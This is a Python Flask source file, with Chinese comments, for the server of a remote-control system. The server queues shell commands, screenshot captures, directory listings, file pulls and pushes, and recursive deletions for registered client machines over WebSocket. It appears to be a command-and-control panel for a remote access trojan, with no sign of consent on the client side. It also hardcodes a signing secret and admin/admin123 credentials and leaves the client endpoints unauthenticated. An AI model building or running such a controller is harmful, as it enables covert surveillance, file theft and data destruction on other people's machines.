import base64
import hashlib
import hmac
import json
import os
import random
import tempfile
import threading
import time
import uuid
from collections import deque
from functools import wraps
from urllib.parse import quote

from flask import send_file
from flask import Flask, request, jsonify, send_from_directory, redirect, json
from flask_sock import Sock
from gevent import sleep
from werkzeug.utils import secure_filename

# Todo 1. 客户端断开自动重连，连接失败自动重新注册
# Todo 2. 规范化服务器前后端以及客户端各种请求格式
# Todo 3. 修复有时在线客户机显示不在线的情况

# ================================ 初始化Flask应用 ================================
app = Flask(__name__)
sock = Sock(app)

# ================================ 全局变量 ================================
SECRET_KEY = b'Ariel20090405'


# 客户端基本状态和信息
clients = {}
# 格式：
# { client_id: {
#      'ip': 客户端IP,
#      'hash': 签名字符串,
#      'commands': [ {'name':'cmd', 'value': '...'}, {'name':'screenshot', 'value': ''}, {'name':'restart_cmd', 'value': ''} ],
#      'cmd_page': 当前CMD窗口内容（字符串）,
#      'last_heartbeat': 时间戳,
#      'ws': websocket对象,
#      'last_screenshot': 截屏文件路径（相对于static目录）
#   }
# }


# 管理员下载客户端文件的结果返回
download_tasks = {}


# dir查询结果
file_results = deque(maxlen=100)


# 格式：
# [
#   {
#     "command_id": <int>,      # 文件指令唯一id，便于查询
#     "client_id": "<uuid>",    # 客户端的client_id
#     "path": "C:/users",       # 查询的目录
#     "files": [                # 返回的目录内容列表
#         {"name": "Public", "is_dir": True},
#         {"name": "config", "is_dir": False}
#     ]
#   },
#   ...
# ]


# 上传任务字典：key = client_id:target_dir:filename
upload_tasks = {}
# 结构示例：
# upload_tasks[task_key] = {
#     "client_id": "...",
#     "target_dir": "/some/dir",
#     "filename": "foo.txt",
#     "status": "pending",  # pending|in_progress|success|failed
#     "added_at": timestamp,
#     "completed_at": None,
#     "error": None,
#     "temp_path": "/abs/path/to/temp/file"
# }

lock = threading.Lock()


# ================================ 工具函数 ================================
def generate_auth_cookie(username):
    digest = hmac.new(SECRET_KEY, username.encode(), hashlib.sha256).digest()
    return base64.b64encode(digest).decode()


def generate_client_hash(client_id):
    digest = hmac.new(SECRET_KEY, client_id.encode(), hashlib.sha256).digest()
    return base64.urlsafe_b64encode(digest).decode().rstrip("=")


def generate_command_id():
    timestamp = int(time.time())
    return random.randint(timestamp-10000, timestamp+10000)


def make_task_key(client_id, path):
    return f"{client_id}:{path}"


def task_exists(client_id, path):
    return make_task_key(client_id, path) in download_tasks


def make_upload_task_key(client_id, target_dir, filename):
    return f"{client_id}:{target_dir}:{filename}"


# ================================ 中间件 ================================
def auth_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        username = request.cookies.get('user')
        cookie_auth = request.cookies.get('auth')
        if not username or not cookie_auth:
            return redirect('/login')
        expected = generate_auth_cookie(username)
        if not hmac.compare_digest(expected, cookie_auth):
            return redirect('/login')
        return f(*args, **kwargs)
    return decorated


# ================================ 基础路由 ================================
@app.route('/login', methods=['GET'])
def login():
    return send_from_directory('templates', 'login.html')


@app.route('/api/auth/login', methods=['POST'])
def api_login():
    data = request.get_json() or request.form
    username = data.get('username')
    password = data.get('password')

    if username == "admin" and password == "admin123":
        auth_cookie = generate_auth_cookie(username)
        response = jsonify({
            "status": "success",
            "message": "登录成功",
            "data": {"user": username, "auth": auth_cookie}
        })
        response.set_cookie('user', username, max_age=1800)
        response.set_cookie('auth', auth_cookie, max_age=1800)
        return response
    return jsonify({
        "status": "fail",
        "message": "账号或密码错误"
    }), 400


# ================================ 管理路由 ================================
@app.route('/admin/clients')
@auth_required
def admin_clients():
    return send_from_directory('templates', 'clients.html')


@app.route('/admin/cmd')
@auth_required
def admin_cmd():
    return send_from_directory('templates', 'cmd.html')


@app.route('/admin/screenshot')
@auth_required
def admin_screenshot():
    return send_from_directory('templates', 'screenshot.html')


@app.route('/admin/dir')
@auth_required
def admin_dir():
    return send_from_directory('templates', 'dir.html')


@app.route('/admin/downloads')
@auth_required
def admin_downloads():
    return send_from_directory('templates', 'downloads.html')


@app.route('/downloads/<client_id>/<filename>', methods=['GET'])
@auth_required
def download_file(client_id, filename):
    """
    提供下载文件，文件存储在 downloads/<client_id>/<filename>
    """
    directory = os.path.join(os.getcwd(), "downloads", client_id)
    # 安全检查：确保目录存在且文件名安全
    if not os.path.isdir(directory):
        return jsonify(status="fail", message="No such client directory"), 404

    # send_from_directory 会自动设置 Content-Disposition attachment
    return send_from_directory(
        directory,
        filename,
        as_attachment=True
    )


@app.route('/admin/uploads')
@auth_required
def admin_uploads():
    return send_from_directory('templates', 'uploads.html')


# ================================ 管理接口 ================================
@app.route('/api/admin/clients')
@auth_required
def api_admin_clients():
    with lock:
        client_list = [{
            'client_id': cid,
            'ip': info['ip'],
            'last_heartbeat': time.ctime(info['last_heartbeat']),
            'status': 'Online' if info['ws'] else 'Offline'
        } for cid, info in clients.items()]
    return jsonify({"status": "success", "data": client_list})


@app.route('/api/admin/cmd', methods=['GET', 'POST'])
@auth_required
def api_admin_cmd():
    if request.method == 'GET':
        client_id = request.args.get('clientid')
        with lock:
            cmd_page = clients.get(client_id, {}).get('cmd_page', '')
        return jsonify({"status": "success", "data": {"cmd_page": cmd_page}})

    # POST处理
    data = request.get_json() or request.form
    client_id = data.get('client_id')
    name = data.get('name')
    with lock:
        if client_id not in clients:
            return jsonify({"status": "fail"}), 404

        if name == 'restart_cmd':
            clients[client_id]['commands'].append({'name': 'restart_cmd', 'value': ''})
        else:
            cmd = data.get('command')

            if not cmd: return jsonify({"status": "fail"}), 400
            clients[client_id]['commands'].append({'name': 'cmd', 'value': cmd})

    return jsonify({"status": "success"})


@app.route("/api/admin/cmd/refresh", methods=["POST"])
@auth_required
def api_admin_cmd_refresh():
    # 尝试从 JSON body 中读取 client_id
    payload = request.get_json(force=True, silent=True)
    client_id = None
    if payload:
        client_id = payload.get("client_id")
    # 如果 JSON 中没有，再尝试从 query string 中读取
    if not client_id:
        client_id = request.args.get("clientid")

    if not client_id:
        return jsonify({
            "status": "fail",
            "message": "Missing clientid parameter",
            "data": None,
            "error": None
        }), 400

    with lock:
        if client_id not in clients:
            return jsonify({
                "status": "fail",
                "message": "Unknown client_id",
                "data": None,
                "error": None
            }), 404

        # 在该客户端的命令队列里添加刷新命令
        clients[client_id].setdefault("commands", []).append({
            "name": "refresh_cmd",
            "value": ""
        })

    return jsonify({
        "status": "success",
        "message": "Refresh command issued",
        "data": {"client_id": client_id},
        "error": None
    }), 200


@app.route("/api/admin/screenshot", methods=["GET", "POST"])
@auth_required
def api_admin_screenshot():
    if request.method == "GET":
        client_id = request.args.get("clientid")
        if not client_id:
            return jsonify(status="fail", message="Missing clientid"), 400

        with lock:
            if client_id not in clients:
                return jsonify(status="fail", message="Unknown client_id"), 404
            last_file = clients[client_id].get("last_screenshot", "")

        return jsonify(
            status="success",
            message="Screenshot retrieved",
            data={"filename": last_file, "client_id": client_id}
        )

    # POST: 下发截屏命令
    data = request.get_json() or request.form
    client_id = data.get("clientid")
    if not client_id:
        return jsonify(status="fail", message="Missing clientid"), 400

    with lock:
        if client_id not in clients:
            return jsonify(status="fail", message="Unknown client_id"), 404
        clients[client_id].setdefault("commands", []).append({"name": "screenshot", "value": ""})

    return jsonify(status="success", message="Screenshot command issued", data={"client_id": client_id})


@app.route('/api/admin/dir', methods=['GET'])
@auth_required
def api_admin_dir():
    # GET: 下发 dir 命令并轮询等待客户端上报结果
    client_id = request.args.get('clientid')
    path = request.args.get('path')
    if not client_id or not path:
        return jsonify({
            "status": "fail",
            "message": "Missing clientid or path parameter",
            "data": None,
            "error": None
        }), 400

    with lock:
        if client_id not in clients:
            return jsonify({
                "status": "fail",
                "message": "Unknown client_id",
                "data": None,
                "error": None
            }), 404
        # 生成唯一的命令ID
        cmd_id = generate_command_id()
        # 下发 dir 命令
        clients[client_id].setdefault("commands", []).append({
            "name": "dir",
            "path": path,
            "command_id": cmd_id
        })

    # 轮询等待客户端上报结果
    timeout = 30.0
    interval = 1.0
    waited = 0.0
    result = None
    while waited < timeout:
        with lock:
            for i, item in enumerate(file_results):
                if item["command_id"] == cmd_id and item["client_id"] == client_id:
                    result = item
                    del file_results[i]
                    break
        if result:
            break
        time.sleep(interval)
        waited += interval

    if not result:
        return jsonify({
            "status": "fail",
            "message": "Timeout waiting for directory result",
            "data": None,
            "error": None
        }), 504

    return jsonify({
        "status": "success",
        "message": "Directory result retrieved successfully",
        "data": result,
        "error": None
    }), 200


@app.route('/api/admin/download/request', methods=['POST'])
@auth_required
def api_admin_download_request():
    """
    管理员发起下载文件请求：
    请求 JSON:
      { "client_id": "...", "path": "/some/file.txt" }
    返回:
      { status, task }
    """
    data = request.get_json(force=True, silent=True)
    if not data:
        return jsonify(status="fail", message="Invalid JSON"), 400

    client_id = data.get("client_id")
    path      = data.get("path")
    if not client_id or not path:
        return jsonify(status="fail", message="Missing client_id or path"), 400

    with lock:
        # 检查客户端是否存在
        if client_id not in clients:
            return jsonify(status="fail", message="Unknown client_id"), 404

        key = make_task_key(client_id, path)
        # 如果已在队列中，直接返回现有状态
        if key in download_tasks:
            task = download_tasks[key]
            return jsonify(status="ok", task=task), 200

        # 否则，创建新任务
        filename = secure_filename(os.path.basename(path))
        download_tasks[key] = {
            "client_id":    client_id,
            "path":         path,
            "status":       "pending",
            "added_at":     time.time(),
            "ready_at":     None,
            "filename":     filename,
            "download_url": f"/downloads/{client_id}/{filename}"
        }

        # 下发 WebSocket 命令给客户端
        cmd = {
            "name": "download_file",
            "value": path,
            "command_id": generate_command_id()
        }
        clients[client_id].setdefault("commands", []).append(cmd)

        task = download_tasks[key]

    return jsonify(status="ok", task=task), 200


@app.route('/api/admin/download/list', methods=['GET'])
@auth_required
def api_download_list():
    """
    管理员获取所有下载任务状态
    可选查询参数：
      - status: pending | in_progress | ready | failed
      - client_id
    """
    status_filter = request.args.get('status')
    client_filter = request.args.get('client_id')

    with lock:
        tasks = []
        for task in download_tasks.values():
            if status_filter and task['status'] != status_filter:
                continue
            if client_filter and task['client_id'] != client_filter:
                continue
            tasks.append({
                'client_id':    task['client_id'],
                'path':         task['path'],
                'status':       task['status'],
                'added_at':     time.ctime(task['added_at']),
                'ready_at':     time.ctime(task['ready_at']) if task['ready_at'] else None,
                'download_url': task['download_url']
            })

    return jsonify(status="success", tasks=tasks), 200


@app.route('/api/admin/upload/request', methods=['POST'])
@auth_required
def api_admin_upload_request():
    """
    管理员发起上传文件到客户端请求。
    multipart/form-data:
      - client_id
      - target_dir
      - file
    """
    client_id = request.form.get('client_id')
    target_dir = request.form.get('target_dir')
    file_obj = request.files.get('file')

    if not client_id or not target_dir or not file_obj:
        return jsonify(status="fail", message="Missing parameters"), 400

    # 验证客户端存在
    with lock:
        if client_id not in clients:
            return jsonify(status="fail", message="Unknown client_id"), 404

    # 使用原始文件名，保留 Unicode
    filename = file_obj.filename
    task_key = make_upload_task_key(client_id, target_dir, filename)

    # 对 task_key 进行 URL 编码
    encoded_key = quote(task_key, safe='')

    with lock:
        # 已存在且未失败，不重复添加
        if task_key in upload_tasks and upload_tasks[task_key]['status'] != 'failed':
            return jsonify(status="ok", task=upload_tasks[task_key]), 200

        # 将文件保存到临时目录
        tmp_dir = tempfile.gettempdir()
        temp_path = os.path.join(tmp_dir, f"{uuid.uuid4().hex}_{filename}")
        file_obj.save(temp_path)

        # 创建任务
        upload_tasks[task_key] = {
            "client_id":    client_id,
            "target_dir":   target_dir,
            "filename":     filename,
            "status":       "pending",
            "added_at":     time.time(),
            "completed_at": None,
            "error":        None,
            "temp_path":    temp_path
        }

        # 下发 WebSocket 命令给客户端，使用编码后的 key
        cmd = {
            "name": "upload_file",
            "value": {
                "task_key":     task_key,
                "download_url": f"/api/client/upload/download?task_key={encoded_key}",
                "target_dir":   target_dir,
                "filename":     filename
            },
            "command_id": generate_command_id()
        }
        clients[client_id].setdefault("commands", []).append(cmd)

        task = upload_tasks[task_key]

    return jsonify(status="ok", task=task), 200


@app.route('/api/admin/upload/list', methods=['GET'])
@auth_required
def api_admin_upload_list():
    """
    管理员获取所有上传任务
    可选查询参数：
      - status: pending|in_progress|success|failed
      - client_id
    """
    status_filter = request.args.get("status")
    client_filter = request.args.get("client_id")

    with lock:
        tasks = []
        for task_key, task in upload_tasks.items():
            if status_filter and task["status"] != status_filter:
                continue
            if client_filter and task["client_id"] != client_filter:
                continue
            tasks.append({
                "client_id":    task["client_id"],
                "target_dir":   task["target_dir"],
                "filename":     task["filename"],
                "status":       task["status"],
                "added_at":     time.ctime(task["added_at"]),
                "completed_at": time.ctime(task["completed_at"]) if task["completed_at"] else None,
                "error":        task["error"]
            })

    return jsonify(status="success", tasks=tasks), 200


@app.route('/api/admin/mkdir', methods=['POST'])
@auth_required
def api_admin_mkdir():
    """
    在客户端指定目录下创建新文件夹。
    请求 JSON:
      {
        "client_id": "xxx",
        "parent_path": "C:/Users/Public",
        "new_dir_name": "NewFolder"
      }
    """
    data = request.get_json(force=True, silent=True)
    if not data:
        return jsonify(status="fail", message="Invalid JSON"), 400

    client_id    = data.get("client_id")
    parent_path  = data.get("parent_path")
    new_dir_name = data.get("new_dir_name")

    if not client_id or not parent_path or not new_dir_name:
        return jsonify(status="fail", message="Missing parameters"), 400

    # 验证客户端存在
    with lock:
        if client_id not in clients:
            return jsonify(status="fail", message="Unknown client_id"), 404

        # 拼接目标路径
        target_path = parent_path.rstrip("/\\") + os.sep + new_dir_name

        # 下发 WebSocket mkdir 命令
        cmd = {
            "name": "mkdir",
            "value": {"path": target_path},
            "command_id": generate_command_id()
        }
        clients[client_id].setdefault("commands", []).append(cmd)

    return jsonify(status="ok", message=f"mkdir command issued for {target_path}"), 200


@app.route('/api/admin/delete', methods=['POST'])
@auth_required
def api_admin_delete():
    """
    删除客户端指定的文件或文件夹（递归删除）。
    请求 JSON:
      {
        "client_id": "xxx",
        "target_path": "C:/Users/Public/file_or_dir"
      }
    """
    data = request.get_json(force=True, silent=True)
    if not data:
        return jsonify(status="fail", message="Invalid JSON"), 400

    client_id   = data.get("client_id")
    target_path = data.get("target_path")

    if not client_id or not target_path:
        return jsonify(status="fail", message="Missing parameters"), 400

    # 验证客户端存在
    with lock:
        if client_id not in clients:
            return jsonify(status="fail", message="Unknown client_id"), 404

        # 下发 WebSocket delete 命令
        cmd = {
            "name": "delete",
            "value": {"path": target_path},
            "command_id": generate_command_id()
        }
        clients[client_id].setdefault("commands", []).append(cmd)

    return jsonify(status="ok", message=f"delete command issued for {target_path}"), 200


# ================================ 客户端接口 ================================
@app.route('/api/client/reg', methods=['GET'])
def client_reg():
    client_ip = request.remote_addr
    client_id = uuid.uuid4().hex
    client_hash = generate_client_hash(client_id)

    with lock:
        clients[client_id] = {
            'ip': client_ip,
            'hash': client_hash,
            'commands': [],
            'cmd_page': "",
            'last_heartbeat': time.time(),
            'ws': None,
            'last_screenshot': ""
        }

    return jsonify({
        'status': 'success',
        'client_id': client_id,
        'hash': client_hash,
        'ip': client_ip
    })


@sock.route('/api/client/ws')
def client_ws(ws):
    client_id = request.args.get('client_id')
    client_hash = request.args.get('hash')

    # 如果参数缺失则关闭连接
    if not client_id or not client_hash:
        ws.close()
        return

    with lock:
        client = clients.get(client_id)

        expected_hash = generate_client_hash(client_id)

        if (client is None) and (hmac.compare_digest(expected_hash, client_hash)):
            # 服务器内存没有客户端，但是哈希校验通过，就自动注册，无需手动注册了
            client_ip = request.remote_addr
            # 直接使用传入的 client_hash 因为哈希校验已经通过
            clients[client_id] = {
                'ip': client_ip,
                'hash': client_hash,
                'commands': [],
                'cmd_page': "",
                'last_heartbeat': time.time(),
                'ws': None,
                'last_screenshot': ""
            }
            client = clients[client_id]
        elif not hmac.compare_digest(client['hash'], client_hash):
            # 如果存在记录，但哈希校验失败，则关闭连接
            ws.close()
            return

        client['ws'] = ws
        client['last_heartbeat'] = time.time()

    try:
        while True:
            with lock:
                if commands := client['commands']:
                    client['commands'] = []
                    ws.send(json.dumps({'commands': commands}))
            sleep(0.1)
    except Exception as e:
        with lock:
            client['ws'] = None
            print(f"Client {client_id} disconnected: {e}")

@app.route("/api/client/screenshot", methods=["POST"])
def client_screenshot():
    """
    客户端上传截屏接口
    """
    try:
        payload = request.get_json(force=True)
    except:
        return "Invalid JSON", 400

    client_id = payload.get("client_id")
    screenshot_b64 = payload.get("screenshot")
    if not client_id or not screenshot_b64:
        return "Missing parameters", 400

    dir_path = os.path.join(app.static_folder, "screenshots")
    os.makedirs(dir_path, exist_ok=True)

    filename = f"screenshots/{client_id}_{int(time.time())}.png"
    full_path = os.path.join(app.static_folder, filename)
    try:
        with open(full_path, "wb") as f:
            f.write(base64.b64decode(screenshot_b64))
    except Exception:
        return "Failed to save screenshot", 500

    with lock:
        if client_id in clients:
            clients[client_id]["last_screenshot"] = filename

    return jsonify(status="success", filename=filename)


@app.route("/api/client/cmd_page_update", methods=["POST"])
def client_cmd_page_update():
    """
    客户端上报当前 CMD 页面内容：
    请求 JSON 格式：
    {
      "client_id": "xxx",
      "cmd_page": "当前 CMD 输出字符串"
    }
    """
    payload = request.get_json(force=True, silent=True)
    if not payload:
        return jsonify(status="fail", err="Invalid JSON"), 400

    client_id = payload.get("client_id")
    cmd_page = payload.get("cmd_page")
    if not client_id or cmd_page is None:
        return jsonify(status="fail", err="Missing client_id or cmd_page"), 400

    with lock:
        if client_id not in clients:
            return jsonify(status="fail", err="Unknown client_id"), 404

        # 更新 cmd_page 和心跳时间
        clients[client_id]['cmd_page'] = cmd_page
        clients[client_id]['last_heartbeat'] = time.time()

    return jsonify(status="success", message="cmd_page updated successfully"), 200


@app.route('/api/client/dir_result', methods=['POST'])
def client_dir_result():
    # 原 web.py 中的 ClientDirResult.POST 逻辑
    # 客户端上报 dir 查询结果
    payload = request.get_json(force=True, silent=True)
    if not payload:
        return jsonify({
            "status": "fail",
            "message": "Invalid JSON",
            "data": None,
            "error": "parse error"
        }), 400

    client_id  = payload.get("client_id")
    command_id = payload.get("command_id")
    path       = payload.get("path")
    files      = payload.get("files")
    if not client_id or command_id is None or not path or files is None:
        return jsonify({
            "status": "fail",
            "message": "Missing parameters: client_id, command_id, path and files are required",
            "data": None,
            "error": None
        }), 400

    # 将结果追加到全局 file_results
    with lock:
        file_results.append({
            "command_id": command_id,
            "client_id": client_id,
            "path": path,
            "files": files
        })

    return jsonify({
        "status": "success",
        "message": "Dir result submitted successfully",
        "data": None,
        "error": None
    }), 200


@app.route('/api/client/upload', methods=['POST'])
def api_client_upload():
    """
    客户端接收到 download_file 命令后，将文件通过此接口上传。
    表单字段:
      - client_id
      - path         （原始请求的文件绝对路径，用于匹配任务）
      - file         （文件二进制，form-data）
    """
    client_id = request.form.get("client_id")
    path      = request.form.get("path")
    file_obj  = request.files.get("file")

    if not client_id or not path or not file_obj:
        return jsonify(status="fail", message="Missing parameters"), 400

    key = make_task_key(client_id, path)
    with lock:
        # 校验任务是否存在
        task = download_tasks.get(key)
        if not task:
            return jsonify(status="fail", message="No such download task"), 404

        # 存储文件
        save_dir = os.path.join("downloads", client_id)
        os.makedirs(save_dir, exist_ok=True)
        filename = task["filename"]
        save_path = os.path.join(save_dir, filename)
        try:
            file_obj.save(save_path)
        except Exception as e:
            task["status"] = "failed"
            return jsonify(status="fail", message="Save failed"), 500

        # 更新任务状态
        task["status"]   = "ready"
        task["ready_at"] = time.time()

    return jsonify(status="ok", download_url=task["download_url"]), 200


@app.route('/api/client/upload/download', methods=['GET'])
def api_client_upload_download():
    """
    客户端调用此接口下载待上传文件内容。
    Query string:
      - task_key
    返回: 文件二进制流
    """
    task_key = request.args.get('task_key')
    if not task_key:
        return jsonify(status="fail", message="Missing task_key"), 400

    with lock:
        task = upload_tasks.get(task_key)
        if not task:
            return jsonify(status="fail", message="No such upload task"), 404
        task['status'] = 'in_progress'

        temp_path = task['temp_path']
        filename = task['filename']

    if not os.path.isfile(temp_path):
        with lock:
            task['status'] = 'failed'
            task['error'] = 'Temp file missing'
            task['completed_at'] = time.time()
        return jsonify(status="fail", message="Temp file missing"), 500

    return send_file(
        temp_path,
        as_attachment=True,
        download_name=filename,  # Flask >=2.0 正确的参数
        mimetype='application/octet-stream'
    )


@app.route('/api/client/upload/result', methods=['POST'])
def api_client_upload_result():
    """
    客户端上报上传任务执行结果
    JSON body:
      {
        "client_id": "...",
        "task_key": "...",
        "status": "success" | "failed",
        "error": "optional error message"
      }
    """
    payload = request.get_json(force=True, silent=True)
    if not payload:
        return jsonify(status="fail", message="Invalid JSON"), 400

    client_id = payload.get("client_id")
    task_key  = payload.get("task_key")
    status    = payload.get("status")
    error_msg = payload.get("error", "")

    if not client_id or not task_key or status not in ("success", "failed"):
        return jsonify(status="fail", message="Missing or invalid parameters"), 400

    with lock:
        task = upload_tasks.get(task_key)
        if not task:
            return jsonify(status="fail", message="No such upload task"), 404

        # 仅允许该客户端上报自己的任务
        if task["client_id"] != client_id:
            return jsonify(status="fail", message="client_id mismatch"), 403

        # 更新状态
        task["status"]       = status
        task["completed_at"] = time.time()
        task["error"]        = error_msg or None

    return jsonify(status="ok"), 200


# ================================ 静态文件服务 ================================
@app.route('/static/<path:filename>')
def static_file(filename):
    response = send_from_directory('static', filename)
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    return response


# ================================ 启动服务 ================================
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
